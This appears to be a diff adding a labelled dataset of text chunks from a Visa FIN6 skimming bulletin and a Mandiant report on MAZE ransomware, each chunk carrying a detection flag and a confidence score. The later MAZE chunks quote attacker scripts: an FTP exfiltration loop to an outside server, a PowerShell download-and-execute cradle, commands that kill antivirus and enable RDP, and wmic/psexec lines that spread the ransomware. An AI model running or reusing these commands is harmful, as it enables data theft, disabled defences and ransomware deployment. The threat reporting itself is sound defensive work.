+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6866133809089661
+        },
+        "prediction": {}
+    },
+    {
+        "text": "\u2022  Consider using a fully-hosted checkout solution where customers enter their payment details \non another webpage hosted by that checkout solution, separate from the merchant\u2019s site. This is \nthe most secure way to protect the merchant and their customers from eCommerce skimming \nmalware. Hosted checkout forms embedded inline on the merchant\u2019s checkout page, such as Visa \nCheckout, are another secure option. \n \u2022  Use a Payment Card Industry Data Security Standard (PCI DSS) validated third-party service \nprovider to store, process or transmit cardholder data. Criminals commonly target merchant \nwebsites that process payment data. When merchants use a validated and secure service provider, \nrisk exposure for CNP fraud and compromise decreases. A list of validated, registered service \nproviders is available on the Global Registry of Service Providers.  \n",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.23734912276268005
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Comply consistently with industry security standards, such as the Payment Card Industry Data \nSecurity Standard (PCI DSS), including the PCI Best Practices for Securing e-Commerce, January \n2017. \n Visa Public \nVisa Payment Fraud Disruption  \n\u2022  Set up a Web Application Firewall to block suspicious and malicious requests from reaching the \nwebsite.",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.5627993941307068
+        },
+        "prediction": {}
+    },
+    {
+        "text": "\u2022  Require strong administrative passwords (use a password manager for best results) and enable \n\u2022  Regularly ensure shopping cart, other services, and all software are upgraded or patched to \nthe latest versions to keep attackers out. \n \u2022  ",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.6249739527702332
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Monitor for suspicious activity\u2014create and regularly check logs and receive alerts if changes to \n\u2022  Ensure staff are trained in security best practices and follow the designated procedures. \n If a merchant suspects a compromise, they should contact their acquiring bank immediately for guidance \non next steps and to ensure compliance with all Visa investigation and compliance guidelines.",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": true,
+            "confidence": 0.561444103717804
+        },
+        "prediction": {}
+    },
+    {
+        "text": "For more \ninformation, refer to the What to Do If Compromised (WTDIC) guide. \n PCI Best Practices for Securing e-Commerce, January 2017  \nPCI How-to Guide for Incident Management   \nFor more information, please contact paymentintelligence@visa.com  \n To report a data breach, contact Visa Fraud Control: \n\u2022  Asia Pacific Region, Central Europe/Middle East/Africa Region: VIFraudControl@visa.com \n\u2022 \n\u2022 \n\u2022  U.S. and Canada: USFraudControl@visa.com \nEurope:  Datacompromise@visa.com \nLatin America & Caribbean: LACFraudInvestigations@visa.com  \n",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.39304816722869873
+        },
+        "prediction": {}
+    },
+    {
+        "text": "This report is intended for informational purposes only and should not be relied upon for operational, marketing, legal, \ntechnical, tax, financial or other advice. Visa is not responsible for your use of the information contained in this report \n(including errors, omissions, or non-timeliness of any kind) or any assumptions or conclusions you may draw from it. \n Dissemination or redistribution of PFD products without express permission is strictly prohibited. \n",
+        "source": "fin6-cybercrime-group-expands-threat-To-ecommerce-merchants.pdf",
+        "detection": {
+            "response": false,
+            "confidence": 0.40637075901031494
+        },
+        "prediction": {}
+    },
+    {
+        "text": "mandiant.com uses cookies to deliver and enhance the quality of its services and to analyze traffic. If you agree, cookies are also used to serve advertising and to personalize the content and advertisements that you see.",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5806446671485901
+        },
+        "prediction": {}
+    },
+    {
+        "text": "mandiant.com uses cookies to deliver and enhance the quality of its services and to analyze traffic. If you agree, cookies are also used to serve advertising and to personalize the content and advertisements that you see.",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5806446671485901
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Targeted ransomware incidents have brought a threat of disruptive and destructive attacks to organizations across industries and geographies. FireEye Mandiant Threat Intelligence has previously documented this threat in our investigations of trends across ransomware incidents, FIN6 activity, implications for OT networks, and other aspects of post-compromise ransomware deployment. Since November 2019, we\u2019ve seen the MAZE ransomware being used in attacks that combine targeted ransomware use, public exposure of victim data, and an affiliate model.\n",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.42507219314575195
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Malicious actors have been actively deploying MAZE ransomware since at least May 2019. The ransomware was initially distributed via spam emails and exploit kits before later shifting to being deployed post-compromise. Multiple actors are involved in MAZE ransomware operations, based on our observations of alleged users in underground forums and distinct tactics, techniques, and procedures across Mandiant incident response engagements.",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.4804176390171051
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Actors behind MAZE also maintain a public-facing website where they post data stolen from victims who refuse to pay an extortion fee.\n The combination of these two damaging intrusion outcomes\u2014dumping sensitive data and disrupting enterprise networks\u2014with a criminal service makes MAZE a notable threat to many organizations. This blog post is based on information derived from numerous Mandiant incident response engagements and our own research into the MAZE ecosystem and operations.\n Mandiant Threat Intelligence will be available to answer questions on the MAZE ransomware threat in a May 21 webinar.\n We are aware of more than 100 alleged MAZE victims reported by various media outlets and on the MAZE website since November 2019. These organizations have been primarily based in North America, although victims spanned nearly every geographical region.",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.3740759789943695
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Nearly every industry sector including manufacturing, legal, financial services, construction, healthcare, technology, retail, and government has been impacted demonstrating that indiscriminate nature of these operations (Figure 1).\n",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.36818474531173706
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Mandiant identified multiple Russian-speaking actors who claimed to use MAZE ransomware and were seeking partners to fulfill different functional roles within their teams. Additional information on these actors is available to Mandiant Intelligence subscribers. A panel used to manage victims targeted for MAZE ransomware deployment has a section for affiliate transactions. This activity is consistent with our assessment that MAZE operates under an affiliate model and is not distributed by a single group.",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.4885915517807007
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Under this business model, ransomware developers will partner with other actors (i.e. affiliates) who are responsible for distributing the malware. In these scenarios, when a victim pays the ransom demand, the ransomware developers receive a commission. Direct affiliates of MAZE ransomware also partner with other actors who perform specific tasks for a percentage of the ransom payment. This includes partners who provide initial access to organizations and pentesters who are responsible for reconnaissance, privilege escalation and lateral movement\u2014each of which who appear to work on a percentage-basis. Notably, in some cases, actors may be hired on a salary basis (vs commission) to perform specific tasks such as determining the victim organization and its annual revenues. This allows for specialization within the cyber criminal ecosystem, ultimately increasing efficiency, while still allowing all parties involved to profit.\n",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.3789414167404175
+        },
+        "prediction": {}
+    },
+    {
+        "text": "MAZE ransomware was initially distributed directly via exploit kits and spam campaigns through late 2019. For example, in November 2019, Mandiant observed multiple email campaigns delivering Maze ransomware primarily to individuals at organizations in Germany and the United States, although a significant number of emails were also delivered to entities in Canada, Italy, and South Korea. These emails used tax, invoice, and package delivery themes with document attachments or inline links to documents which download and execute Maze ransomware.\n",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.4514361321926117
+        },
+        "prediction": {}
+    },
+    {
+        "text": "On November 6 and 7, a Maze campaign targeting Germany delivered macro-laden documents using the subject lines \u201cWichtige informationen uber Steuerruckerstattung\u201d and \u201c1&1 Internet AG - Ihre Rechnung 19340003422 vom 07.11.19\u201d (Figure 3). Recipients included individuals at organizations in a wide range of industries, with the Financial Services, Healthcare, and Manufacturing sectors being targeted most frequently. These emails were sent using a number of malicious domains created with the registrant address gladkoff1991@yandex.ru.\n On November 8, a campaign delivered Maze primarily to Financial Services and Insurance organizations located in the United states. These emails originated from a compromised or spoofed account and contained an inline link to download a Maze executable payload.\n",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.402128130197525
+        },
+        "prediction": {}
+    },
+    {
+        "text": "On November 18 and 19, a Maze campaign targeted individuals operating in a range of industries in the United States and Canada with macro documents using phone bill and package delivery themes (Figure 4 and Figure 5).",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5997304916381836
+        },
+        "prediction": {}
+    },
+    {
+        "text": "These emails used the subjects \u201cMissed package delivery\u201d and \"Your AT&T wireless bill is ready to view\" and were sent using a number of malicious domains with the registrant address abusereceive@hitler.rocks. Notably, this registrant address was also used to create multiple Italian-language domains towards the end of November 2019.\n",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6198068857192993
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Actors using MAZE have increasingly shifted to deploying the ransomware post-compromise. This methodology provides an opportunity to infect more hosts within a victim\u2019s environment and exfiltrate data, which is leveraged to apply additional pressure on organizations to pay extortion fees.",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6066520810127258
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Notably, in at least some cases, the actors behind these operations charge an additional fee, in addition to the decryption key, for the non-release of stolen data.\n Although the high-level intrusion scenarios preceding the distribution of MAZE ransomware are broadly similar, there have been notable variations across intrusions that suggest attribution to distinct teams. Even within these teams, the cyber criminals appear to be task-oriented meaning that one operator is not responsible for the full lifecycle. The following sections highlight the TTPs seen in a subset of incidents and serve to illustrate the divergence that may occur due to the fact that numerous, disparate actors are involved in different phases of these operations. Notably, the time between initial compromise to encryption has also been widely varied, from weeks to many months.\n",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.39126116037368774
+        },
+        "prediction": {}
+    },
+    {
+        "text": "This is consistent with our observations of multiple actors who use MAZE soliciting partners with network access. The following are a sample of observations from several Mandiant incident response engagements:\nThe use of legitimate credentials and broad distribution of BEACON across victim environments appear to be consistent approaches used by actors to establish their foothold in victim networks and to maintain presence as they look to meet their ultimate objective of deploying MAZE ransomware.",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.49449506402015686
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Despite these commonplace behaviors, we have observed an actor create their own domain account to enable latter-stage operations.\n ",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.569699764251709
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Although Mandiant has observed multiple cases where MAZE intrusion operators employed Mimikatz to collect credentials to enable privilege escalation, these efforts have also been bolstered in multiple cases via use of Bloodhound, and more manual searches for files containing credentials.\n  Mandiant has observed a broad range of approaches to network, host, data, and Active Directory reconnaissance across observed MAZE incidents.",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.4152882993221283
+        },
+        "prediction": {}
+    },
+    {
+        "text": "The varied tools and approaches across these incidents maybe best highlights the divergent ways in which the responsible actors interact with victim networks.\n ",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.7463990449905396
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Across the majority of MAZE ransomware incidents lateral movement was accomplished via Cobalt Strike BEACON and using previously harvested credentials.",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.6968621611595154
+        },
+        "prediction": {}
+    },
+    {
+        "text": "There was evidence suggesting data exfiltration across most analyzed MAZE ransomware incidents. While malicious actors could monetize stolen data in various way (e.g. sale in an underground forum, fraud), actors employing MAZE are known to threaten the release of stolen data if victim organizations do not pay an extortion fee.\n In addition to data theft, actors deploy MAZE ransomware to encrypt files identified on the victim network. Notably, the aforementioned MAZE panel has an option to specify the date on which ransom demands will double, likely to create a sense of urgency to their demands.\n Based on our belief that the MAZE ransomware is distributed by multiple actors, we anticipate that the TTPs used throughout incidents associated with this ransomware will continue to vary somewhat, particularly in terms of the initial intrusion vector.",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.34299996495246887
+        },
+        "prediction": {}
+    },
+    {
+        "text": "For more comprehensive recommendations for addressing ransomware, please refer to our Ransomware Protection and Containment Strategies blog post and the linked white paper.\n Organizations can validate their security controls against more than 20 MAZE-specific actions with Mandiant Security Validation. Please see our Headline Release Content Updates \u2013 April 21, 2020 on the Mandiant Security Validation Customer Portal for more information.\n",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.57218998670578
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Mandiant currently tracks three separate clusters of activity involved in the post-compromise distribution of MAZE ransomware. Future data collection and analysis efforts may reveal additional groups involved in intrusion activity supporting MAZE operations, or may instead allow us to collapse some of these groups into larger clusters.",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5574077367782593
+        },
+        "prediction": {}
+    },
+    {
+        "text": "It should also be noted that \u2018initial access\u2019 phase techniques have been included in these mappings, though in some cases this access may have been provided by a separate threat actor(s).\n",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.5922861099243164
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Data from Network Shared Drive\nT1039: Data from Network Shared Drive\nfunction Enum-UsersFolders($PathEnum)\n{\n    $foldersArr = 'Desktop','Downloads','Documents','AppData/Roaming','AppData/Local'\n\n    Get-ChildItem -Path $PathEnum'/c$' -ErrorAction SilentlyContinue\n    Get-ChildItem -Path $PathEnum'/c$/Program Files' -ErrorAction SilentlyContinue\n    Get-ChildItem -Path $PathEnum'/c$/Program Files (x86)' -ErrorAction SilentlyContinue\n\n    foreach($Directory in Get-ChildItem -Path $PathEnum'/c$/Users' -ErrorAction SilentlyContinue) {\n\n        foreach($SeachDir in $foldersArr) {\n            Get-ChildItem -Path $PathEnum'/c$/Users/'$Directory'/'$SeachDir -ErrorAction SilentlyContinue\n        }\n    }\n}\nPowerShell reconnaissance script used to enumerate directories\n$Dir=\"C:/Windows/Temp/\"\n#ftp server\n$ftp = \"ftp://<IP Address>/incoming/\"\n$user = \"<username>\"\n$pass = \"<password>\"\n$webclient = New-Object System.",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.07941269129514694
+        },
+        "prediction": {}
+    },
+    {
+        "text": "NetworkCredential($user,$pass)\n#list every sql server trace file\nforeach($item in (dir $Dir \"*.7z\")){\n   \"Uploading $item...\"\n   $uri = New-Object System.",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.30644890666007996
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Uri($ftp+$item. Name)\n   $webclient. UploadFile($uri, $item. FullName)\n}\npowershell -nop -exec bypass IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:43984/'); Add-FtpFile -ftpFilePath \"ftp://<IP  Address>/cobalt_uploads/<file name>\" -localFile \"<local file path>\\ <file name> \" -userName \"<username>\" -password \"<password>\"\n[\u2026]\necho 7\necho 7\ntaskkill /im csrss_tc.exe /f\ntaskkill /im kwsprod.exe /f\ntaskkill /im avkwctl.exe /f\ntaskkill /im rnav.exe /f\ntaskkill /im crssvc.exe /f\nsc config CSAuth start= disabled\ntaskkill /im vsserv.exe /f\ntaskkill /im ppmcativedetection.exe /f\n [\u2026]\ntaskkill /im sahookmain.exe /f\ntaskkill /im mcinfo.exe /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nnetsh advfirewall firewall set rule group=\"remote desktop\" new enable=Ye\nc:\\windows\\temp\\sss.exe\nstart copy sss.exe \\\\<internal IP>\\c$\\windows\\temp\\\nstart copy sss.exe \\\\<internal IP>\\c$\\windows\\temp\\\n\nstart copy windows.bat \\\\<internal IP>\\c$\\windows\\temp\\\nstart copy windows.bat \\\\<internal IP>\\c$\\windows\\temp\\\n\nstart wmic /node:\"<internal",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.1638297736644745
+        },
+        "prediction": {}
+    },
+    {
+        "text": "IP>\" /user:\"<DOMAIN\\adminaccount>\" /password:\"<password>\" process call create \"c:\\windows\\temp\\sss.exe\"\nstart wmic /node:\"<internal IP>\" /user:\"<DOMAIN\\adminaccount>\" /password:\"<password>\" process call create \"c:\\windows\\temp\\sss.exe\"\n\nstart wmic /node:\"<internal IP>\" /user:\"<DOMAIN\\adminaccount>\" /password:\"<password>\" process call create \"cmd.exe /c c:\\windows\\temp\\windows.bat\"\nstart wmic /node:\"<internal IP>\" /user:\"<DOMAIN\\adminaccount>\" /password:\"<password>\" process call create \"cmd.exe /c c:\\windows\\temp\\windows.bat\"\n\nstart wmic /node:\"<internal IP>\" /user:\"<DOMAIN\\adminaccount>\" /password:\"<password>\" process call create \"cmd.exe /c copy \\\\<internal IP>\\c$\\windows\\temp\\sss.exe c:\\windows\\temp\\\"\nstart wmic /node:\"<internal IP>\" /user:\"<DOMAIN\\adminaccount>\" /password:\"<password>\" process call create \"cmd.exe /c copy \\\\<internal IP>\\c$\\windows\\temp\\sss.exe c:\\windows\\temp\\\"\n\nstart wmic /node:\"<internal IP>\" /user:\"<DOMAIN\\adminaccount>\" /password:\"<password>\" process call create \"cmd.exe /c copy \\\\<internal IP>\\c$\\windows\\temp\\windows.bat c:\\windows\\temp\\\"\nstart wmic /node:\"<internal IP>\" /user:\"<DOMAIN\\adminaccount>\" /password:\"<password>\" process call create \"cmd.exe /c copy \\\\<internal IP>\\c$\\windows\\temp\\windows.bat c:\\windows\\temp\\\"\nstart psexec.exe \\\\<internal IP> -u <DOMAIN\\adminaccount> -p \"<password>\" -d -h -r rtrsd -s -accepteula -nobanner c:\\windows\\temp\\sss.exe\nstart psexec.exe \\\\<internal IP> -u <DOMAIN\\adminaccount> -p \"<password>\" -d -h -r rtrsd -s -accepteula -nobanner c:\\windows\\temp\\sss.exe\nstart psexec.exe \\\\<internal IP> -u <DOMAIN\\adminaccount> -p \"<password>\" -d -h -r rtrsd -s -accepteula -nobanner c:\\windows\\temp\\windows.bat\nstart psexec.exe \\\\<internal IP> -u <DOMAIN\\adminaccount> -p \"<password>\" -d -h -r rtrsd -s -accepteula -nobanner c:\\windows\\temp\\windows.bat\nExample commands from MAZE distribution scripts\n@echo off\ndel done.txt\ndel offline.txt\nrem Loop thru list of computer names in file specified on command-line\nfor /f",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.12564226984977722
+        },
+        "prediction": {}
+    },
+    {
+        "text": "%%i\ngoto end\n:check_machine\nrem Check to see if machine is up.\n ping -n 1 %1|Find \"TTL=\" >NUL 2>NUL\nif errorlevel 1 goto down\necho %1\nSTART cmd /c \"copy [Location of MAZE binary] \\\\%1\\c$\\windows\\temp && exit\"\ntimeout 1 > NUL\necho %1 >> done.txt\nrem wmic /node:\"%1\" process call create \"regsvr32.exe /i C:\\windows\\temp\\[MAZE binary name]\" >> done.txt\nSTART \"\" cmd /c \"wmic /node:\"%1\" process call create \"regsvr32.exe /i C:\\windows\\temp\\[MAZE binary name]\" && exit\"\ngoto end\n:down\n  rem Report machine down\n  echo %1 >> offline.txt\n:end\nMandiant Threat Intelligence will host an exclusive webinar on Thursday, May 21, 2020, at 8 a.m. PT / 11 a.m. ET to provide updated insight and information into the MAZE ransomware threat, and to answer questions from attendees.",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": false,
+            "confidence": 0.19788946211338043
+        },
+        "prediction": {}
+    },
+    {
+        "text": "Get the Google Cloud Cybersecurity Forecast 2024 report to explore the latest trends on the horizon.\n",
+        "source": "Navigating the MAZE_ Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents _ Mandiant.html",
+        "detection": {
+            "response": true,
+            "confidence": 0.759726881980896
+        },
+        "prediction": {}
+    }
+]
